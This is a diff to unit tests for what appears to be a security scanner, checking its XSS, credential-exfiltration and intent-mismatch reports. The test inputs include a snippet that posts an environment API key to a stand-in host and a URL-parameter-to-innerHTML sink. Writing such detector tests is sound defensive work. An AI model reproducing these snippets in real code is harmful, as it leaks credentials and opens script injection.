@@ -38,6 +38,9 @@ class LaunchRegressions(unittest.TestCase):
         for sink,expected in [('innerHTML',True),('outerHTML',True),('textContent',False)]:
             r=self.scan('const name = new URLSearchParams(location.search).get("name");\ndocument.getElementById("name").'+sink+' = name;', 'JavaScript','Display a user name.')
             self.assertEqual(any(f.get('rule_id')=='javascript.url-to-html' for f in r['engine_findings']),expected)
+            if expected:
+                self.assertNotIn('No obvious risky behavior was detected in this scan.', r['behavior_summary'])
+                self.assertTrue(any('Static-analysis findings' in text for text in r['behavior_summary']))
         r=self.scan('document.getElementById("name").innerHTML = "<b>Hello</b>";', 'JavaScript','Display fixed markup.')
         self.assertFalse(r['engine_findings'])
     def test_credential_aliases_and_reassignment(self):
@@ -54,7 +57,7 @@ class LaunchRegressions(unittest.TestCase):
             self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
     def test_prohibition_and_environment_wording(self):
         r=self.scan('import os, requests\nkey=os.getenv("API_KEY")\nrequests.post("https://unknown.example",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
-        self.assertTrue(any('conflicts with' in s for s in r['intent_mismatches']))
+        self.assertTrue(any('stated restriction' in s for s in r['intent_mismatches']))
         self.assertFalse(any('contain secrets' in s for s in r['intent_mismatches']))
 
     def test_request_construction_is_not_transmission(self):
@@ -78,3 +81,9 @@ class LaunchRegressions(unittest.TestCase):
             flows=[f for f in r['flags'] if f['pattern']=='secret_exfiltration_chain']
             self.assertEqual(len(flows),1,statement)
             self.assertEqual(flows[0]['line'],3)
+
+    def test_data_restriction_is_not_reported_as_proven_network_conflict(self):
+        r=self.scan('import requests\nrequests.post("https://example.com",json={"message":"public"})',intent='Do not transmit credentials or the process environment.')
+        self.assertFalse(any('conflicts with' in x for x in r['intent_mismatches']))
+        self.assertTrue(any('keyword matching alone' in x for x in r['intent_mismatches']))
+        self.assertFalse(any(f.get('severity',0)>=18 for f in r['flags']+r['engine_findings']))
